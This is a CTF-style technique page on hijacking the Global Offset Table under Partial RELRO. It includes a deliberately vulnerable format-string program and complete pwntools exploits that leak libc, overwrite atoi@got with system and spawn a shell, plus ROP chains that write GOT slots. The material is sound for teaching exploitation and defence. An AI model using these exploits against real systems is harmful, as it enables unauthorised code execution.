---
title: "GOT Overwrite - Hijacking the Global Offset Table Under Partial RELRO"
category: pwn
subcategory: relro
type: technique
tags: [got, got-overwrite, got-hijack, plt, relro, partial-relro, full-relro, ret2libc, rop, system, atoi, printf, puts, exit, free, one-gadget, canary, fmtstr, pwntools, checksec]
difficulty: medium
summary: "Partial RELRO leaves .got.plt writable. Point puts/atoi/exit/free at system or a one_gadget and the program calls your shell for you."
when_to_use:
  - "checksec says Partial RELRO (or No RELRO) and the binary is dynamically linked"
  - "You have an arbitrary write primitive but no control of the instruction pointer"
  - "A libc function is called again on attacker-controlled data after your write lands"
  - "The overflow is too short for a full ret2libc chain but long enough to call read() once"
  - "You need persistence: the same GOT entry fires every loop iteration"
tools: [pwntools, checksec, readelf, objdump, ROPgadget, gdb, pwndbg, gef, one_gadget]
related: [rop-fundamentals, rop-ret2libc, rop-one-gadget, rop-ret2dlresolve, rop-stack-pivot, fmtstr-arbitrary-write, fmtstr-read-leak, mitigation-canary-bypass, mitigation-libc-identification, mitigation-modern-playbook, mitigation-partial-overwrite-brute, pwntools-cheatsheet]
---

## TL;DR

Every call to a dynamically linked function goes through `jmp [func@got]`. If that GOT slot is
writable -- which Partial RELRO guarantees -- an arbitrary write turns any future call to `puts`,
`atoi`, `free` or `exit` into a call to `system`, a one_gadget, or `main`. You never touch the
stack, never need `rip` control, and the hijack persists for the life of the process.

## Recognise it

- `checksec` prints `RELRO: Partial RELRO`. That is the whole precondition.
- You have a write primitive: a format string `%n`, a `read()` you can aim, a heap write-what-where,
  or a ROP `mov qword [rdi], rsi ; ret` gadget.
- The program calls a libc function on your data *after* the write: `atoi(line)`, `puts(buf)`,
  `printf(buf)`, `free(ptr)`, `strlen(name)`, `exit(status)`.
- `__stack_chk_fail@got` is in the GOT and the binary has a canary -- smashing the canary on
  purpose then becomes a jump primitive.
- The binary is No PIE, so GOT addresses are constants you can hardcode.
- The program loops, so you get a second interaction after the write lands.

## Vulnerable source

```c
/* vuln.c - a format string in a loop: leak primitive AND write primitive */
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    char line[128];

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    puts("echo server, type away");

    while (1) {
        printf("> ");
        if (!fgets(line, sizeof(line), stdin))
            break;
        printf(line);                 /* %n gives an arbitrary write */
        if (atoi(line) == 1337)       /* atoi@got: called on OUR buffer, every loop */
            puts("nice");
    }
    return 0;
}
```

```sh
# Partial RELRO is the default on every modern distro: .got.plt stays writable
gcc -fno-stack-protector -no-pie -z relro -z lazy -o vuln vuln.c

# No RELRO: .dynamic and .init_array are writable too, even more targets
gcc -fno-stack-protector -no-pie -z norelro -o vuln_norelro vuln.c

# Full RELRO: the GOT is read-only. This exploit will not work against it.
gcc -fno-stack-protector -no-pie -z relro -z now -o vuln_full vuln.c

checksec --file=./vuln
readelf -l ./vuln | grep -A1 GNU_RELRO       # which bytes the loader will mprotect
readelf -r ./vuln | grep JUMP_SLOT           # every hijackable entry, with its address
objdump -R ./vuln                            # the same list, shorter
```

## Theory

### .got vs .got.plt, and what RELRO covers

An ELF has two relocation-fed pointer tables:

- **`.got`** holds data relocations (`R_*_GLOB_DAT`), resolved eagerly at load time.
- **`.got.plt`** holds function relocations (`R_*_JUMP_SLOT`), resolved lazily on first call.
  This is the one PLT stubs read, and the one you overwrite. Confusingly, `elf.got['puts']`
  in pwntools returns the `.got.plt` entry.

| Level | Build flags | `.got` | `.got.plt` | `.dynamic` / `.init_array` | GOT overwrite? |
|---|---|---|---|---|---|
| No RELRO | `-z norelro` | RW | RW | RW | Yes, plus `.fini_array` tricks |
| Partial RELRO | `-z relro -z lazy` | RO | **RW** | RO | **Yes** |
| Full RELRO | `-z relro -z now` | RO | RO (merged) | RO | No |

Partial RELRO exists precisely because lazy binding *needs* `.got.plt` writable: the resolver
writes the real address into the slot on first call. Full RELRO resolves everything up front and
then `mprotect`s the lot, at the cost of slower startup. Verify with:

```sh
readelf -l ./vuln | grep RELRO   # present == relro; BIND_NOW in -d == full
readelf -d ./vuln | grep -E "BIND_NOW|FLAGS"
```

### What a hijack actually does

Before the overwrite:

```
atoi@plt:  jmp [atoi@got]   ->  0x7f... libc atoi
```

After writing `system` into `atoi@got`:

```
atoi@plt:  jmp [atoi@got]   ->  0x7f... libc system
```

The call site is unchanged. `atoi(line)` becomes `system(line)` with `line` still in `rdi`.
That is the beauty of the technique: **the argument is already set up for you**, as long as you
pick a victim whose first argument is a buffer you control.

### Choosing the victim

| Victim | Why | What you write |
|---|---|---|
| `atoi@got` | Called on your raw input, `rdi` = your buffer | `system` |
| `printf@got` | Same, if `printf(buf)` is reachable | `system` |
| `puts@got` | Same, if `puts(buf)` is reachable | `system` |
| `strlen@got` / `strcmp@got` | Called on input by menu parsers | `system` |
| `free@got` | `rdi` = the chunk pointer; write `"/bin/sh"` into the chunk first | `system` |
| `exit@got` | Fires on a clean shutdown, `rdi` is garbage | one_gadget, or `main` for a loop |
| `__stack_chk_fail@got` | Fires when you smash the canary on purpose | `win`, one_gadget |
| `fflush@got`, `setvbuf@got` | Called from `main`'s prologue on re-entry | one_gadget |
| `memset@got`, `strcpy@got` | `rdi` = destination buffer | `system` |

`exit@got -> main` is the standard way to buy a second round when a program is not already in a
loop: you get another pass at the input without ever returning.

### The GOT-entry-to-PLT-stub trick

You do not always need a libc leak. If the binary *already imports* `system` (some challenges do,
or the author left a `system("echo hi")` in), then writing `system@plt` -- a fixed, non-PIE,
leak-free address inside the binary -- into `atoi@got` gives you `system(line)` immediately:

```
atoi@got  <-  &system@plt
atoi(line)  ->  jmp [atoi@got]  ->  system@plt  ->  jmp [system@got]  ->  libc system
```

Two indirections, one write, zero leaks. The address is small (`0x401050`-ish), so on i386 it is a
*two-byte* write, which a format string does in one `%hn`. The same idea works with any imported
function: `puts@got <- printf@plt` turns every `puts` into a format string bug.

### Partial overwrites

libc functions live at a fixed offset from each other, so the low 12 bits of an address are
ASLR-invariant (pages are 4 KB). Overwriting only the low two bytes of a GOT entry moves the target
within a 64 KB window, which needs 4 bits of brute force (1/16 per attempt) but **no leak at all**.
This is how you reach a one_gadget from `puts@got` when you cannot print anything. See
`mitigation-partial-overwrite-brute` and `rop-one-gadget`.

### Write primitives that reach the GOT

| Primitive | Shape |
|---|---|
| Format string | `fmtstr_payload(offset, {elf.got['atoi']: system})` -- see `fmtstr-arbitrary-write` |
| ROP + `read()` | `rop.call('read', [0, elf.got['puts'], 8])`, then send 8 raw bytes |
| ROP + write gadget | `pop rdi ; ret` = GOT address, `pop rsi ; ret` = value, `mov [rdi], rsi ; ret` |
| Heap | tcache poisoning to return a chunk *on* the GOT, then write normally |
| `scanf("%d", ptr)` | If `ptr` is attacker-controlled, a 4-byte write per call |

## Attack

1. `checksec` -- confirm Partial RELRO and No PIE.
2. `objdump -R ./vuln` -- list the GOT entries and pick a victim that is called on your data.
3. Get a libc leak (read a GOT entry, `%N$p` the stack, or use `mitigation-libc-identification`).
4. Compute `system` (or run `one_gadget` on the exact libc).
5. Land the write with whatever primitive you have.
6. Trigger the victim call with `/bin/sh` in the argument position.

## Exploit

```python
#!/usr/bin/env python3
"""
GOT overwrite via a format string: leak libc, point atoi@got at system, type /bin/sh.

Local:   ./exploit.py
Remote:  ./exploit.py HOST PORT
Build:   gcc -fno-stack-protector -no-pie -z relro -z lazy -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

FMT_OFFSET = 6  # printf's 1st stack-arg index for a 64-bit buffer; confirm with %p probing


def start():
    """Local process by default, remote when argv gives host/port."""
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *main\nc\n")
    return process(BINARY)


def leak_got(io, elf_obj, name):
    """Use %s on a GOT address to read the resolved libc pointer out of it."""
    payload = b"%9$sAAA" + p64(elf_obj.got[name])
    io.sendlineafter(b"> ", payload)
    data = io.recvuntil(b"AAA", drop=True)
    return u64(data.ljust(8, b"\x00"))


def probe_offset(io):
    """Find which %N$ slot holds the start of our own buffer."""
    for i in range(1, 20):
        io.sendlineafter(b"> ", b"AAAAAAAA|%%%d$p" % i)
        line = io.recvline()
        if b"0x4141414141414141" in line:
            log.success("format string offset = %d", i)
            return i
    log.warning("offset probe failed, falling back to %d", FMT_OFFSET)
    return FMT_OFFSET


def main():
    io = start()
    io.recvuntil(b"echo server, type away\n")

    offset = probe_offset(io)

    leak = leak_got(io, elf, "puts")
    libc = ELF(LIBC, checksec=False)
    libc.address = leak - libc.symbols["puts"]
    system = libc.symbols["system"]
    log.success("puts   @ %#x", leak)
    log.success("libc   @ %#x", libc.address)
    log.success("system @ %#x", system)

    # The write: atoi@got <- system. fmtstr_payload splits it into %hn chunks.
    payload = fmtstr_payload(offset, {elf.got["atoi"]: system}, write_size="short")
    log.info("fmtstr payload is %d bytes", len(payload))
    io.sendlineafter(b"> ", payload)

    # atoi(line) is now system(line). fgets keeps the newline; /bin/sh\n is fine.
    io.sendlineafter(b"> ", b"/bin/sh")
    io.interactive()


if __name__ == "__main__":
    main()
```

The same overwrite through a ROP chain, for when the primitive is a stack overflow instead of a
format string -- three interchangeable ways to get 8 bytes into a GOT slot:

```python
#!/usr/bin/env python3
"""Three ROP-based routes to the same GOT overwrite."""
from pwn import *

context.arch = "amd64"

POP_RDI = 0x401253      # pop rdi ; ret
POP_RSI_R15 = 0x401251  # pop rsi ; pop r15 ; ret
MOV_RDI_RSI = 0x4011E6  # mov qword [rdi], rsi ; ret
READ_PLT = 0x401060
PUTS_GOT = 0x404018
SYSTEM = 0x7FFFF7E1A290  # from your leak; placeholder here


def via_write_gadget(got, value):
    """pop the destination, pop the value, store it. No syscall, no libc call."""
    return flat(POP_RDI, got, POP_RSI_R15, value, 0, MOV_RDI_RSI)


def via_read_plt(got, nbytes=8):
    """read(0, got, 8) - you then send the raw 8 bytes on the same socket."""
    return flat(POP_RDI, 0, POP_RSI_R15, got, 0, READ_PLT)


def via_pwntools(elf_path, got_name, value):
    """The declarative version, when you have the ELF on disk."""
    elf = ELF(elf_path, checksec=False)
    rop = ROP(elf)
    rop.call("read", [0, elf.got[got_name], 8])
    rop.call("main")
    return rop.chain(), p64(value)


def main():
    log.info("write gadget route : %s", enhex(via_write_gadget(PUTS_GOT, SYSTEM)))
    log.info("read@plt route     : %s", enhex(via_read_plt(PUTS_GOT)))
    log.info("then send exactly p64(system) as the read() body")
    # chain, body = via_pwntools('./vuln', 'puts', SYSTEM)


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Full RELRO ends the technique.** The GOT is read-only; a write faults. Move to
  `rop-ret2libc`, `rop-one-gadget` via the stack, exit handlers, or a FILE vtable.
- **You overwrote the function you need to keep using.** Writing `system` into `puts@got` means
  your next `puts("prompt")` runs `system("prompt")` and fails. Pick a victim you are done with,
  or one whose argument you control at the moment it fires.
- **`printf@got <- system` breaks the leak.** Leak first, write second. Always.
- **one_gadget constraints.** `exit@got -> one_gadget` only works if the constraint
  (`rsp+0x40 == NULL`, `rcx == NULL`, ...) happens to hold at that call site. Check them in gdb
  at the actual `call` instruction. See `rop-one-gadget`.
- **Lazy binding means the slot may still point at PLT+6.** That is not a problem for writing,
  but it means *leaking* an unresolved entry gives you a binary address, not a libc one. Leak a
  function that has definitely been called already (`puts`, `printf`, `setvbuf`).
- **Partial RELRO does not protect `.fini_array`** under No RELRO only. Under Partial RELRO,
  `.init_array` and `.fini_array` are inside `GNU_RELRO` and already read-only -- do not waste
  time on them unless `checksec` says `No RELRO`.
- **Format-string write size.** `fmtstr_payload(..., write_size='short')` emits `%hn` (2 bytes at
  a time, 4 writes for a 64-bit pointer) which is far shorter than byte-at-a-time. If the buffer
  is tiny, do a partial overwrite of the low two bytes instead.
- **`free@got -> system` needs the chunk to contain the command.** `free(p)` becomes
  `system(p)`, so write `"/bin/sh\x00"` into the chunk's data area first, then free it.
- **`__stack_chk_fail@got` is a free jump.** Overwrite it, then deliberately corrupt the canary.
  The program "detects" the smash and calls your address instead of aborting. Works even with the
  canary enabled and unknown.
- **i386 GOT entries are 4 bytes**, so a single `%n` writes the whole thing and a `%hn` writes
  half. That makes `atoi@got <- system@plt` a one-shot two-byte write.
- **Read the entry back.** After writing, leak the slot again to confirm the bytes landed. A
  `fmtstr_payload` that is one dollar-index off silently writes to the wrong address.
- **Seccomp.** If `execve` is filtered, `system` is useless; point the GOT at `mprotect` and jump
  to shellcode, or go the open/read/write route in `shellcode-seccomp-orw`.

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` | Partial vs Full RELRO -- the go/no-go check |
| `objdump -R ./vuln` | Every GOT entry and its address, one line each |
| `readelf -r ./vuln` | The same with relocation types (`JUMP_SLOT` = `.got.plt`) |
| `readelf -l ./vuln \| grep -A1 RELRO` | Exactly which bytes the loader will make read-only |
| `elf.got['atoi']` / `elf.plt['system']` | pwntools address lookups, PIE-rebased automatically |
| `fmtstr_payload(off, {addr: val})` | Turns a `%n` into a clean arbitrary write |
| `one_gadget ./libc.so.6` | Candidates for `exit@got` / `__stack_chk_fail@got` |
| `gdb` + `pwndbg`: `got`, `plt` | Live dump of every GOT slot and where it currently points |
